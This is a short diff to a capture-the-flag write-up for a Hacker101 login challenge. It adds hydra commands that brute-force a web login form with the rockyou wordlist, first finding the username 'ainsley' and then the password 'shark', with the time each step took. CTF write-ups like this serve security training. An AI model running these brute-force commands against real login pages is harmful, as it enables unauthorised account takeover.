@@ -51,3 +51,11 @@ I tried both fasttrack and john work lists and they both do not work.
 So I increased the number of tasks and chose the rockyou word list instead.
 
 hydra -L /usr/share/wordlists/rockyou.txt -p aaa c4858c57522b16e943eb970e26bb51cf.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid username" -S -F -t 64
+
+Username found: ainsley
+Time to username: 33 minutes
+
+hydra -l ainsley -P /usr/share/wordlists/rockyou.txt aeb3b9c5344b3adaee6084ce9ad86eca.ctf.hacker101.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid password" -S -F -t 64
+
+Password found: shark
+Time to password: 31 minutes
